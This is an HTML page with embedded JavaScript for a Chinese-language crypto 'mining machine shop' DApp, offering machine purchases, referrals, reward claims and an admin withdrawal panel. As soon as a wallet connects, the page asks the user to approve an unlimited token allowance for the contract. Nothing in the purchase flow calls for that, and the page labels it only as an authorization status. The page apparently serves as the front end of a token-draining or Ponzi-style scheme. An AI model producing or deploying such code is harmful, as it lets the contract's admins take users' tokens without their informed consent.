<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>矿机商店 DApp 全功能</title>
  <style>
    body { font-family: sans-serif; margin: 0; padding: 0; background: #121212; color: white; }
    .container { max-width: 900px; margin: auto; padding: 20px; }
    button { padding: 10px 20px; margin: 10px 5px; }
    input { padding: 5px; margin: 5px; width: 200px; }
    .panel { border: 1px solid #444; padding: 10px; margin-top: 20px; border-radius: 5px; }
  </style>
</head>
<body>
  <div class="container">
    <h1>矿机商店 DApp</h1>
    <button id="connectBtn">连接钱包</button>
    <div id="userPanel" style="display:none;">
      <p>地址：<span id="userAddress"></span></p>
      <p>授权状态：<span id="approvalStatus"></span></p>

      <div class="panel">
        <h3>矿机购买</h3>
        <button onclick="buyInitialMachine()">购买初始矿机</button>
        <button onclick="buyTestMachine()">购买测试矿机</button>
        <input id="tierId" placeholder="Power等级 0-3" />
        <input id="count" placeholder="数量" />
        <button onclick="buyPowerMachine()">购买Power矿机</button>
      </div>

      <div class="panel">
        <h3>推荐系统</h3>
        <input id="referrerInput" placeholder="推荐人地址" />
        <button onclick="setReferrer()">设置推荐人</button>
      </div>

      <div class="panel">
        <h3>奖励系统</h3>
        <button onclick="claimRewards()">领取收益</button>
      </div>
    </div>

    <div id="adminPanel" class="panel" style="display:none;">
      <h3>管理员面板</h3>
      <input id="withdrawAmount" placeholder="提取代币数量" />
      <button onclick="withdrawBNB()">提取BNB</button>
      <button onclick="withdrawTokens()">提取代币</button>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const CONTRACT_ADDRESS = "0x9dCcEd4Ef738856D2c289D4116cD219c698B22ba";
    const TOKEN_ADDRESS = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
    let provider, signer, contract, userAddress;

    const CONTRACT_ABI = [
      "function buyInitialMachine() payable",
      "function buyTestMachine() payable",
      "function buyPowerMachine(uint256,uint256)",
      "function setReferrer(address)",
      "function claimRewards()",
      "function withdrawBNB()",
      "function withdrawTokens(uint256)",
      "function admin(address) view returns (bool)",
      "function rewardToken() view returns (address)",
    ];

    async function connectWallet() {
      if (!window.ethereum) return alert("请安装钱包插件");

      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      userAddress = await signer.getAddress();

      document.getElementById("userAddress").innerText = userAddress;
      document.getElementById("userPanel").style.display = "block";
      document.getElementById("connectBtn").innerText = "已连接";

      contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      const isAdmin = await contract.admin(userAddress);
      if (isAdmin) document.getElementById("adminPanel").style.display = "block";

      await checkApproval();
    }

    async function checkApproval() {
      const tokenAbi = [
        "function allowance(address owner, address spender) view returns (uint256)",
        "function approve(address spender, uint256 amount) returns (bool)"
      ];
      const token = new ethers.Contract(TOKEN_ADDRESS, tokenAbi, signer);
      const allowance = await token.allowance(userAddress, CONTRACT_ADDRESS);
      if (allowance.gt(ethers.constants.Zero)) {
        document.getElementById("approvalStatus").innerText = "已授权";
      } else {
        const tx = await token.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
        await tx.wait();
        document.getElementById("approvalStatus").innerText = "授权完成";
      }
    }

    async function buyInitialMachine() {
      const tx = await contract.buyInitialMachine({ value: ethers.utils.parseEther("0.01") });
      await tx.wait();
      alert("购买成功！");
    }

    async function buyTestMachine() {
      const tx = await contract.buyTestMachine({ value: ethers.utils.parseEther("0.001") });
      await tx.wait();
      alert("测试矿机购买成功！");
    }

    async function buyPowerMachine() {
      const tierId = document.getElementById("tierId").value;
      const count = document.getElementById("count").value;
      const tx = await contract.buyPowerMachine(tierId, count);
      await tx.wait();
      alert("Power矿机购买成功！");
    }

    async function setReferrer() {
      const ref = document.getElementById("referrerInput").value;
      const tx = await contract.setReferrer(ref);
      await tx.wait();
      alert("推荐人设置成功！");
    }

    async function claimRewards() {
      const tx = await contract.claimRewards();
      await tx.wait();
      alert("奖励领取成功！");
    }

    async function withdrawBNB() {
      const tx = await contract.withdrawBNB();
      await tx.wait();
      alert("BNB 提取成功！");
    }

    async function withdrawTokens() {
      const amount = document.getElementById("withdrawAmount").value;
      const tx = await contract.withdrawTokens(ethers.utils.parseUnits(amount));
      await tx.wait();
      alert("代币提取成功！");
    }

    document.getElementById("connectBtn").onclick = connectWallet;
  </script>
</body>
</html>